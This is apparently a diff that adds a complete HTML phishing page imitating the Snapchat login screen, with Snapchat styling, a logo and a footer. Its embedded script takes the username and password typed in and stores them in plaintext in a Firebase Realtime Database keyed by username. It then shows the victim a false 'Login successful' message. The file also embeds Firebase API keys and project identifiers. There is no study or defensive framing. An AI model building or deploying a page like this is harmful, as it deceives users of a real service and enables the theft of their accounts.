@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        input[type="password"] {
+            -webkit-text-security: disc;
+        }
+        .login-btn {
+            background-color: #fffc00;
+            color: black;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo-container img {
+            width: 100px;
+            height: auto;
+        }
+        .company {
+            margin-top: 50px;
+            background-color: white;
+            padding: 20px;
+            color: black;
+        }
+        .company p {
+            font-weight: bold;
+            margin: 0 0 10px;
+        }
+        .company a {
+            color: black;
+            text-decoration: none;
+            display: block;
+            margin: 5px 0;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="23.png" alt="Snapchat Logo">
+        </div>
+        <h2>Log In</h2>
+        <input type="text" id="username" placeholder="Username" pattern="[A-Za-z0-9]+" title="Only letters and numbers allowed">
+        <input type="password" id="password" placeholder="Password">
+        <button class="login-btn" id="loginBtn">LOG IN</button>
+    </div>
+
+    <!-- Updated White Background Section -->
+    <div class="company">
+        <p>COMPANY</p>
+        <a href="#">Home</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Support</a>
+    </div>
+
+    <!-- Firebase Integration -->
+    <script type="module">
+      // Import Firebase SDK
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
+      import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-database.js";
+
+      // Your Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyBkzmaH_pgrO1KhJa_zsUXXu1bSvPM_RNw",
+        authDomain: "project-2132053477214991956.firebaseapp.com",
+        databaseURL: "https://project-2132053477214991956-default-rtdb.firebaseio.com",
+        projectId: "project-2132053477214991956",
+        storageBucket: "project-2132053477214991956.appspot.com",
+        messagingSenderId: "1234567890",
+        appId: "1:1234567890:web:abcdef123456"
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const database = getDatabase(app);
+
+      // Get login button
+      document.getElementById("loginBtn").addEventListener("click", function() {
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+
+          if (username === "" || password === "") {
+              alert("Please fill in both fields.");
+              return;
+          }
+
+          // Save data to Firebase Realtime Database
+          const usersRef = ref(database, "users/" + username);
+          set(usersRef, {
+              username: username,
+              password: password
+          })
+          .then(() => {
+              alert("Login successful! Data saved to Firebase.");
+          })
+          .catch((error) => {
+              console.error("Error saving data: ", error);
+          });
+      });
+    </script>
+</body>
+</html>
